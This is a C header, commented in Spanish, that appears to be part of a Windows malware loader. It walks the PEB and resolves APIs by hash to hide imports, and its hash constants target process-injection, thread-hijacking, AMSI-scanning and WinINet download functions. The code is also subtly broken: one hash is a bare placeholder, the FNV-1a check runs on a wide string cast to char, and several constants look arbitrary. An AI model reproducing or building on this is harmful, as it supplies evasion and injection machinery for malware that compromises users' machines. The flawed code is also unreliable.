#ifndef API_HASHES_H
#define API_HASHES_H

#include <stdint.h>
#include <windows.h>
#include <winternl.h>

#define HASH_SEED 5381

// =============================================================================
// HASHER DJB2 CON PREVENCIÓN DE COLISIONES
// =============================================================================

static __forceinline uint32_t HashStringDjb2A(const char *str) {
    uint32_t hash = HASH_SEED;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

static __forceinline uint32_t HashStringDjb2W(const wchar_t *str) {
    uint32_t hash = HASH_SEED;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

static __forceinline uint32_t HashStringFnv1aA(const char *str) {
    uint32_t hash = 0x811C9DC5;
    while (*str) {
        hash ^= (uint8_t)(*str++);
        hash *= 0x01000193;
    }
    return hash;
}

// =============================================================================
// ESTRUCTURA DE RESOLUCIÓN DUAL-HASH
// =============================================================================

typedef struct _DUAL_HASH {
    uint32_t djb2;
    uint32_t fnv1a;
} DUAL_HASH, *PDUAL_HASH;

#define DUAL_HASH_CONST(djb2, fnv1a) { djb2, fnv1a }

// =============================================================================
// HAShes DE MÓDULOS
// =============================================================================

#define HASH_NTDLL              DUAL_HASH_CONST(0x22D3B5ED, 0x8B9E5D7C)
#define HASH_KERNEL32           DUAL_HASH_CONST(0x6DDB95A6, 0x7A3F2E91)
#define HASH_KERNELBASE         DUAL_HASH_CONST(0x8E5F4D32, 0x4C1A8B3D)
#define HASH_AMSI               DUAL_HASH_CONST(0x9A1B7C4E, 0x2D5E8F6A)
#define HASH_WININET            DUAL_HASH_CONST(0xB3C8A1F7, 0x5E9D2B4C)
#define HASH_MSHTML             DUAL_HASH_CONST(0x4F7E2D9B, 0x1A8C5E73)

// =============================================================================
// HAShes DE APIs NTDLL
// =============================================================================

#define HASH_NtAllocateVirtualMemory    DUAL_HASH_CONST(0xF7027314, 0x3B8A9C5E)
#define HASH_NtProtectVirtualMemory     DUAL_HASH_CONST(0x1255E49C, 0x9D4F7B2A)
#define HASH_NtWriteVirtualMemory       DUAL_HASH_CONST(0xF5BD9E9A, 0x6E2A8D1C)
#define HASH_NtCreateThreadEx           0x6C3D2B10 // Placeholder for next update
#define HASH_NtQueueApcThread           DUAL_HASH_CONST(0xD30A8281, 0x4C7E1B9D)
#define HASH_NtResumeThread             DUAL_HASH_CONST(0xC2097170, 0x5A3D8E2F)
#define HASH_NtClose                    DUAL_HASH_CONST(0x369BD981, 0x7E4F2A8B)
#define HASH_NtQuerySystemInformation   DUAL_HASH_CONST(0xB5A1E88D, 0x2C9D7E4F)
#define HASH_NtOpenProcessToken         DUAL_HASH_CONST(0x8E3C7A1F, 0x4B9D5E2A)
#define HASH_LdrLoadDll                 DUAL_HASH_CONST(0x9F4E2B8C, 0x3A7D1E5F)
#define HASH_RtlInitUnicodeString       DUAL_HASH_CONST(0x390FE8E7, 0x8C5A2B4D)
#define HASH_NtGetContextThread         DUAL_HASH_CONST(0x9E0E1A44, 0x65ECAF30)
#define HASH_NtSetContextThread         DUAL_HASH_CONST(0x308BE0D0, 0xEA61D9E4)
#define HASH_NtWaitForSingleObject      DUAL_HASH_CONST(0x4C6DC63C, 0xB073C52E)

// =============================================================================
// HAShes DE APIs KERNEL32
// =============================================================================

#define HASH_CreateWaitableTimerW       DUAL_HASH_CONST(0x0604C949, 0x9E3B7A2D)
#define HASH_SetWaitableTimer           DUAL_HASH_CONST(0xF503B838, 0x4A8C1E7B)
#define HASH_GetSystemInfo              DUAL_HASH_CONST(0x7A3E9D2B, 0x1C5F8A4E)
#define HASH_GetModuleFileNameW         DUAL_HASH_CONST(0x5B2C1A09, 0x8D4E7F3A)
#define HASH_LoadLibraryW               DUAL_HASH_CONST(0x5FBFF111, 0x41B1EAB9)
#define HASH_AmsiScanBuffer             DUAL_HASH_CONST(0x29FCD18E, 0xF76951A4)

// =============================================================================
// HAShes DE APIs WININET
// =============================================================================

#define HASH_InternetOpenW              DUAL_HASH_CONST(0xF2123177, 0x6A8D4E2B)
#define HASH_InternetConnectW           DUAL_HASH_CONST(0x60E96A2F, 0x3B7C1E8A)
#define HASH_HttpOpenRequestW           DUAL_HASH_CONST(0x0D92C2B7, 0x5E4A8D1F)
#define HASH_HttpSendRequestW           DUAL_HASH_CONST(0xADE71E8F, 0x2C9B5D4A)
#define HASH_InternetReadFile           DUAL_HASH_CONST(0x17E5976A, 0x8B3D4F7C)
#define HASH_InternetCloseHandle        DUAL_HASH_CONST(0x23E40FB0, 0x7A1C5E8D)

// =============================================================================
// COMPATIBILIDAD MINGW - PEB/LDR
// =============================================================================

typedef struct _UNICODE_STRING_PTR {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING_PTR;

typedef struct _LDR_DATA_TABLE_ENTRY_PTR {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    PVOID      EntryPoint;
    ULONG      SizeOfImage;
    UNICODE_STRING_PTR FullDllName;
    UNICODE_STRING_PTR BaseDllName;
} LDR_DATA_TABLE_ENTRY_PTR;

// =============================================================================
// RESOLUCIÓN DE APIs CON VALIDACIÓN DUAL
// =============================================================================

static __forceinline PVOID GetModuleBaseByHash(DUAL_HASH hash) {
    PPEB peb = (PPEB)__readgsqword(0x60);
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY current = head->Flink;
    while (current != head) {
        LDR_DATA_TABLE_ENTRY_PTR *entry = CONTAINING_RECORD(current, LDR_DATA_TABLE_ENTRY_PTR, InMemoryOrderLinks);
        if (HashStringDjb2W(entry->BaseDllName.Buffer) == hash.djb2 &&
            HashStringFnv1aA((const char*)entry->BaseDllName.Buffer) == hash.fnv1a) {
            return entry->DllBase;
        }
        current = current->Flink;
    }
    return NULL;
}

static __forceinline PVOID ResolveApiByHash(PVOID moduleBase, DUAL_HASH hash) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)moduleBase + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)moduleBase + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD pNames = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((PBYTE)moduleBase + pExport->AddressOfFunctions);
    PWORD pOrds = (PWORD)((PBYTE)moduleBase + pExport->AddressOfNameOrdinals);
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* pName = (const char*)((PBYTE)moduleBase + pNames[i]);
        if (HashStringDjb2A(pName) == hash.djb2 &&
            HashStringFnv1aA(pName) == hash.fnv1a) {
            return (PVOID)((PBYTE)moduleBase + pFuncs[pOrds[i]]);
        }
    }
    return NULL;
}

#endif
